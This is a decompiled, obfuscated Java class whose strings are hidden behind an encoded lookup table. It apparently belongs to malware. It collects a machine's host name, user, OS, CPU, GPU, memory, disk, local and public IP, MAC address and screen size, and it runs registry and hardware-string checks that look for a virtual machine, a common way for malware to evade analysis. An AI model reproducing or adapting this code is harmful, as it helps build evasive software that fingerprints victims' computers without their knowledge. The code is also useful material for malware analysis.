/*
 * Decompiled with CFR 0.152.
 */
package x;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import com.sun.management.OperatingSystemMXBean;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.lang.management.ManagementFactory;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public final class j {
    public String a;
    public String b;
    public String c;
    public String d;
    public String e;
    public String f;
    public String g;
    public String h;
    public String i;
    public String j;
    public String k;
    public String l;
    public String m;
    public String n;
    public boolean o;
    private static final OkHttpClient p = new OkHttpClient.Builder().connectTimeout(8L, TimeUnit.SECONDS).readTimeout(8L, TimeUnit.SECONDS).build();

    public static j a() {
        j j2 = new j();
        try {
            j2.a = InetAddress.getLocalHost().getHostName();
        }
        catch (Exception exception) {
            j2.a = $S.d(884);
        }
        j2.b = System.getenv($S.d(846));
        if (j2.b == null) {
            j2.b = System.getProperty($S.d(1028));
        }
        j2.c = System.getProperty($S.d(34)) + " " + System.getProperty($S.d(1029));
        j2.d = System.getProperty($S.d(1030));
        j2.e = x.j.c();
        j2.f = x.j.d();
        j2.g = x.j.e();
        Object object = new File($S.d(1031));
        object = new long[]{((File)object).getFreeSpace(), ((File)object).getTotalSpace()};
        j2.h = x.j.a((long)object[1]);
        j2.i = x.j.a((long)object[0]);
        j2.j = x.j.f();
        j2.k = x.j.g();
        j2.l = System.getProperty($S.d(1032)) + "_" + System.getProperty($S.d(1033));
        j2.m = x.j.h();
        j2.n = x.j.i();
        j2.o = x.j.j();
        return j2;
    }

    private static String c() {
        try {
            return Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, $S.d(1034), $S.d(1035)).trim();
        }
        catch (Exception exception) {
            return $S.d(321);
        }
    }

    private static String d() {
        try {
            return x.j.a($S.d(38), $S.d(11), $S.d(1036), $S.d(389), $S.d(9)).trim().replace($S.d(1037), "").trim();
        }
        catch (Exception exception) {
            return $S.d(321);
        }
    }

    private static String e() {
        long l2 = Runtime.getRuntime().totalMemory();
        long l3 = Runtime.getRuntime().freeMemory();
        try {
            OperatingSystemMXBean operatingSystemMXBean = (OperatingSystemMXBean)ManagementFactory.getOperatingSystemMXBean();
            l2 = operatingSystemMXBean.getTotalPhysicalMemorySize();
            l3 = operatingSystemMXBean.getFreePhysicalMemorySize();
        }
        catch (Exception exception) {}
        return String.format($S.d(1038), l2 / 1024L / 1024L, l3 / 1024L / 1024L);
    }

    private static String a(long l2) {
        return l2 / 1024L / 1024L / 1024L + $S.d(1039);
    }

    private static String f() {
        try {
            Enumeration<NetworkInterface> enumeration = NetworkInterface.getNetworkInterfaces();
            while (enumeration.hasMoreElements()) {
                Object object = enumeration.nextElement();
                if (!((NetworkInterface)object).isUp() || ((NetworkInterface)object).isLoopback()) continue;
                object = ((NetworkInterface)object).getInetAddresses();
                while (object.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress)object.nextElement();
                    if (!(inetAddress instanceof Inet4Address) || inetAddress.isLoopbackAddress()) continue;
                    return inetAddress.getHostAddress();
                }
            }
        }
        catch (Exception exception) {}
        return $S.d(884);
    }

    public static String b() {
        Object object = new Request.Builder().url($S.d(1040)).build();
        object = p.newCall((Request)object).execute();
        try {
            String string;
            String string2 = string = ((Response)object).body() != null ? ((Response)object).body().string().trim() : $S.d(884);
            if (object != null) {
                ((Response)object).close();
            }
            return string;
        }
        catch (Throwable throwable) {
            try {
                if (object != null) {
                    try {
                        ((Response)object).close();
                    }
                    catch (Throwable throwable2) {
                        throwable.addSuppressed(throwable2);
                    }
                }
                throw throwable;
            }
            catch (Exception exception) {
                return $S.d(884);
            }
        }
    }

    private static String g() {
        try {
            Object object = NetworkInterface.getNetworkInterfaces();
            while (object.hasMoreElements()) {
                Object object2 = object.nextElement();
                if (!((NetworkInterface)object2).isUp() || ((NetworkInterface)object2).isLoopback()) continue;
                byte[] byArray = ((NetworkInterface)object2).getHardwareAddress();
                object2 = byArray;
                if (byArray == null || ((Object)object2).length <= 0) continue;
                object = new StringBuilder();
                for (Object object3 : object2) {
                    ((StringBuilder)object).append(String.format($S.d(1041), (byte)object3));
                }
                Object object4 = object;
                return ((StringBuilder)object4).deleteCharAt(((StringBuilder)object4).length() - 1).toString();
            }
        }
        catch (Exception exception) {}
        return $S.d(884);
    }

    private static String h() {
        try {
            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
            return dimension.width + "x" + dimension.height;
        }
        catch (Exception exception) {
            return $S.d(884);
        }
    }

    private static String i() {
        try {
            String string = x.j.a($S.d(38), $S.d(1042), $S.d(11), $S.d(1043), $S.d(389), $S.d(568));
            return string.replace($S.d(568), "").trim().replace("\r", "").replace("\n", ", ");
        }
        catch (Exception exception) {
            return $S.d(321);
        }
    }

    private static boolean j() {
        try {
            String string = x.j.c().toUpperCase();
            if (string.contains($S.d(1044)) || string.contains($S.d(1045)) || string.contains($S.d(1046)) || string.contains($S.d(1047)) || string.contains($S.d(1048))) {
                return true;
            }
            if (Advapi32Util.registryKeyExists(WinReg.HKEY_LOCAL_MACHINE, $S.d(1049))) {
                return true;
            }
            if (Advapi32Util.registryKeyExists(WinReg.HKEY_LOCAL_MACHINE, $S.d(1050))) {
                return true;
            }
        }
        catch (Exception exception) {}
        return false;
    }

    private static String a(String ... object) {
        try {
            int n2;
            object = new ProcessBuilder((String[])object);
            ((ProcessBuilder)object).redirectErrorStream(true);
            object = ((ProcessBuilder)object).start();
            Object object2 = new ByteArrayOutputStream();
            byte[] byArray = new byte[8192];
            InputStream inputStream2 = ((Process)object).getInputStream();
            while ((n2 = inputStream2.read(byArray)) != -1) {
                ((ByteArrayOutputStream)object2).write(byArray, 0, n2);
            }
            object2 = ((ByteArrayOutputStream)object2).toByteArray();
            ((Process)object).waitFor();
            return new String((byte[])object2);
        }
        catch (Exception exception) {
            return "";
        }
    }
}

